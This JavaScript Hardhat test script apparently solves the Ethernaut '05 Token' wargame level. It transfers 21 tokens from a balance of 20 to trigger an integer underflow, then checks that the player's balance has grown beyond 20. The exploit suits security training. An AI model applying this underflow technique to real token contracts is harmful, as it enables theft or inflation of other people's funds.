const { ethers } = require("hardhat")
const { assert, expect } = require("chai")

/* 
    Enter the contract address below.
    Use `await contract.address in the console to get the address.
*/
const CONTRACT_ADDRESS = "0xcEA16c2CA66A442049BEfb2ddc3AAE8DDf2f5745"
const RANDOM_ADDRESS = "0x0123456789ABCDEF012345689ABCDEF012345678"

describe("05 Token", function () {
    let player, challengeContract

    before(async function () {
        ;[player] = await ethers.getSigners()
        challengeContract = await ethers.getContractAt(
            "Token",
            CONTRACT_ADDRESS,
            player
        )
        const balanceBefore = await challengeContract.balanceOf(player.address)
        assert.equal(balanceBefore.toString(), "20")
    })

    it("Execution", async function () {
        const txResponse = await challengeContract.transfer(
            RANDOM_ADDRESS,
            "21"
        )
        await txResponse.wait(1)
    })

    after(async function () {
        const balanceAfter = await challengeContract.balanceOf(player.address)
        expect(Number(balanceAfter)).to.be.greaterThan(Number("20"))
    })
})
